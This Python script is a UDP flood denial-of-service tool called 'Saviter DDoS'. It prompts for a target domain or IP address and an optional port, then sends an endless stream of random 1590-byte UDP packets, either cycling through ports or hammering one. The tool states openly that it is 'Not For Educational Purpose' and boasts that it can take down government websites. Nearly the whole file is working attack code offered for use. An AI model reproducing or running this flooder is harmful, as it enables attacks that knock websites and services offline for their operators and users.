#SAVITER DDOS By The Truth
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


version = "beta"


uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1590)


while True:

    print("\033[31;1m")
    print('''
╔══════════════════════════════════════════════╗
║░█▀▀░█▀█░█░█░▀█▀░▀█▀░█▀█░█▀▄░░░█▀▄░█▀▄░█▀█░█▀▀║
║░▀▀█░█▀█░▀▄▀░░█░░░█░░█▀█░█▀▄░░░█░█░█░█░█░█░▀▀█║
║░▀▀▀░▀░▀░░▀░░▀▀▀░░▀░░▀░▀░▀░▀░░░▀▀░░▀▀░░▀▀▀░▀▀▀║
╚══════════════════════════════════════════════╝
                        By''')
    print(''' 
        ░▀█▀░█░█░█▀▀░░░▀█▀░█▀▄░█░█░▀█▀░█░█
        ░░█░░█▀█░█▀▀░░░░█░░█▀▄░█░█░░█░░█▀█
        ░░▀░░▀░▀░▀▀▀░░░░▀░░▀░▀░▀▀▀░░▀░░▀░▀''''')
    print("")
    print("Иди и занимайся своими дерьмовыми вещами")
    print("")
    print("You Can Stop The Attack By Pressing The CTRL+Z Or CTRL+C")
    print("")
    print("This Tool Is Not For Educational Purpose")
    print("")
    print("Please Choose The Fucking Method Between Those Two")
    print("")
    print("A. Website Domain\nB. IP Address\nC. About\nE. Exit")
    print('\033[31m')
    
    opt = str(input("\nВЫБИРАТЬ "))

    if opt == 'A':
        domain = str(input("Domain Name: :"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == 'B':
        ip = str(input(" Enter The IP Address: "))
        break

    elif opt == 'C':
        print('''
Saviter DDoS Is A powerful DDoS Distributed Denial of Server Tool Made by The Truth Team

Can Take Down Government Websites 

Telegram Channel: https://t.me/TheTruth5383

X: TheTheTruth5383     
   
We Are One !!
 ''')
        goon = input("\n\n\n\n\n\n\nPress Enter to continue.")
        os.system(cmd_clear)

    elif opt == 'E':
        exit()

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)


port_mode = False 
port = 2

while 1:
    port_bool = str(input("Certain port? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Please Write The Port Number : "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

os.system(cmd_clear)
print('\033[31;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(5)

sent = 0

if port_mode == False: 
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[31;1mSent %s Packets To %s Through Port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True:
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[31;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mSaviter DDoS\033[0m')
